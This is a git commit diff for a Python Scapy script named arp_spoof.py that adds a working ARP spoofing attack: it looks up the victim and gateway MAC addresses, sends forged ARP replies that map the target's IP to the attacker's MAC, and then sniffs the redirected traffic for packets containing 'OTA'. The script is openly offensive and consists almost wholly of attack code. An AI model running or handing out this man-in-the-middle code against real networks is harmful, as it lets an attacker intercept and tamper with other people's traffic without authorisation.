d574e5a6ac7eedd303b41143058958421be73fd3
popjy0312 <popjy0312@naver.com>
2017-10-10 07:00:46 +0900

    send arp ok

--- arp_spoof.py
+++ arp_spoof.py
@@ -13,16 +13,28 @@ print "arp spoofing " + sys.argv[2] + " to " + sys.argv[3] + " start!!"
 MyMac = get_if_hwaddr(InterFace)
 MyIp = get_if_addr(InterFace)
 
+print "My Mac Addr is " + MyMac
+
 def findMacAddr():
     global SenderMac
-    arppkt = Ether(dst = BLOADCASTMAC, src = MyMac)/ARP(op=ARP.who_has, hwsrc=MyMac, psrc=MyIp, hwdst=UNKNOWNMAC, pdst=SenderIp)
-    print arppkt.show()
-    p = srp(arppkt, iface=InterFace)
-    print p.show()
+    #arppkt = Ether(dst = BLOADCASTMAC, src = MyMac)/ARP(op=ARP.who_has, hwsrc=MyMac, psrc=MyIp, hwdst=UNKNOWNMAC, pdst=SenderIp)
+    #p = srp1(arppkt, iface=InterFace)
 
-def poison(sIp, tIp):
-    arppkt = Ether(dst = SenderMac, src = TargetMac)/ARP(op=ARP.is_at, )
+    p = arping(SenderIp, iface = InterFace)
+    rep = p[0][0][1]
+    SenderMac = rep[ARP].hwsrc
 
+    global TargetMac
+    p = arping(TargetIp, iface = InterFace)
+    rep = p[0][0][1]
+    TargetMac = rep[ARP].hwsrc
+
+    print "Sender Mac Addr is " + SenderMac
+    print "Target Mac Addr is " + TargetMac
+
+def poison(sIp, tIp, sMac):
+    arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=MyMac, psrc=tIp, hwdst=sMac, pdst=sIp)
+    sendp(arppkt)
 
 def cb(pkt):
     if "OTA" in str(pkt):
@@ -33,5 +45,8 @@ def cb(pkt):
 
 
 findMacAddr()
+
+raw_input(">")
+poison(SenderIp, TargetIp, SenderMac)
 
 sniff(iface=InterFace, prn=cb)
